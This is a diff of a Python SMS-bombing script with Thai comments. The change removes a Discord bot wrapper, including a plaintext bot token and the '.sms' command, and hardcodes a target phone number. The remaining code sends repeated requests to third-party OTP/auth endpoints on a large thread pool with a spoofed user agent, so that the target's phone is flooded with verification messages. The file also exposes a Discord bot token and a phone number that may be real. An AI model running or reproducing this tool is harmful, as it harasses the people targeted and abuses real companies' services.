@@ -6,10 +6,7 @@ from re import search
 from random import choice
 from string import ascii_uppercase, digits
 from concurrent.futures import ThreadPoolExecutor
-from discord.ext import commands
 
-PREFIX = '.' #คำนำหน้าตอนใช้คำสั่ง
-TOKEN = 'ODk1MDE0MzcxMzQyODExMTg2.YVyZFg.1JpFC3Ej30hfJ3p1zEioZO3Ky7o' #token ของบอท
 LIMIT = 1000 #จำนวนสูงสุดที่ใส่ได้ต่อการยิง 1 ครั้ง
 
 bot = commands.Bot(command_prefix=PREFIX)
@@ -20,6 +17,9 @@ def randomString(N):
 
 threading = ThreadPoolExecutor(max_workers=int(100000000))
 useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"
+
+phone = 0622281676
+amount = 100
 
 def sk1(phone):
     post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "933204459624996876", "User-Agent": useragent},json={"phone": f"66{phone}"})
@@ -1624,49 +1624,6 @@ def startall(phone, amount):
         threading.submit(sk63, phone)
         threading.submit(sk64, phone)
 
-
-@bot.event
-async def on_command_error(ctx, error):
-    print(str(error))
-
-@bot.event
-async def on_connect():
-    print(f"Login as : {bot.user.name}#{bot.user.discriminator}")
-
-@bot.command()
-async def help(ctx):
-    await ctx.send(f"> **คำสั่งยิงเบอร์** | {PREFIX}sms [เบอร์] [เวลา1- {str(LIMIT)}นาที]",delete_after=15)
-    await ctx.message.delete()
-
-@bot.command()
-async def sms(ctx, phone=None, amount=None):
-    if (str(ctx.message.channel.id) == '964116456939860008'):
-        if (phone == None or amount == None):
-            await ctx.send("> กรุณาใส่ข้อมูลให้ครบถ้วน",delete_after=15)
-            await ctx.message.delete()
-            
-        else:
-            try:
-                amount = int(amount)
-                if (amount > LIMIT):
-                    await ctx.send(f"> กรุณาใส่จำนวนไม่เกิน {str(LIMIT)}",delete_after=15)
-                    await ctx.message.delete()
-
-                else:
-                    await ctx.send(f"> เริ่มยิงไปที่เบอร์ **{phone}** แล้ว | เวลา **{amount}**นาที",delete_after=15)
-                    startall(phone, amount)
-                    await ctx.message.delete()
-
-            except:
-                await ctx.send("> คุณใส่จำนวนไม่ถูกต้อง",delete_after=15)
-                await ctx.message.delete()
-
-                
-    else:
-        await ctx.send("> โปรดใช้คำสั่งในห้องที่ถูกต้อง",delete_after=15)
-        await ctx.message.delete()
-
-bot.run(TOKEN, reconnect=True)
 
 
 #--------------------------------------------------------  --------------------------------------------------------
